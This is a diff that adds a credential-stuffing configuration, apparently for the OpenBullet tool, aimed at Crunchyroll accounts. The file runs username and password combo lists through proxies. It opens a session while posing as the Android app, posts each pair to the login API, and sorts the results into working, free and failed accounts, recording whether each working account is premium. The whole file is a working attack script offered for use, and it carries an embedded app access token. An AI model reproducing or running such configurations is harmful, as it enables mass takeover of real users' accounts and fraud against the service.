@@ -1,0 +1,68 @@
+[SETTINGS]
+{
+  "Name": "Crunchyroll",
+  "SuggestedBots": 1,
+  "LastModified": "2018-04-29T15:22:50.5842711+02:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://api.crunchyroll.com/start_session.0.json" AutoRedirect=TRUE 
+  CONTENT "locale=enUS&device_id=ffffffff-8890-a339-c4c1-03907679fb22&device_type=com.crunchyroll.crunchyroid&access_token=Scwg9PRRZ19iVwD&version=439" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Android-Application-Version-Code: 439" 
+  HEADER "Using-Brightcove-Player: 1" 
+  HEADER "X-Android-SDK: 24" 
+  HEADER "X-Android-Device-Manufacturer: samsung" 
+  HEADER "X-Android-Application-Version-Name: 2.1.6" 
+  HEADER "X-Android-Device-Product: dreamltexx" 
+  HEADER "X-Android-Release: 7.0" 
+  HEADER "X-Android-Device-Model: SM-G950F" 
+  HEADER "X-Android-Device-Is-GoogleTV: 0" 
+PARSE "<SOURCE>" LR "\"session_id\":\"" "\"" Recursive=FALSE -> VAR "SESSIONID" "" "" 
+REQUEST POST "https://api.crunchyroll.com/login.0.json" AutoRedirect=TRUE 
+  CONTENT "account=<USER>&password=<PASS>&locale=enUS&session_id=<SESSIONID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G950F Build/NRD90M)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Android-Application-Version-Code: 439" 
+  HEADER "Using-Brightcove-Player: 1" 
+  HEADER "X-Android-SDK: 24" 
+  HEADER "X-Android-Device-Manufacturer: samsung" 
+  HEADER "X-Android-Application-Version-Name: 2.1.6" 
+  HEADER "X-Android-Device-Product: dreamltexx" 
+  HEADER "X-Android-Release: 7.0" 
+  HEADER "X-Android-Device-Model: SM-G950F" 
+  HEADER "X-Android-Device-Is-GoogleTV: 0" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "user\",\"user_id" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"premium\":\"\"" 
+  KEYCHAIN Failure OR 
+    KEY "Your account has been locked." 
+    KEY "You forgot to put in your password." 
+    KEY "Incorrect login information." 
+    KEY " not found.\"}" 
+    KEY "internal_server_error" 
+PARSE "<SOURCE>" LR "\"premium\":\"" "\"" Recursive=FALSE -> CAP "Premium?" "" "" 
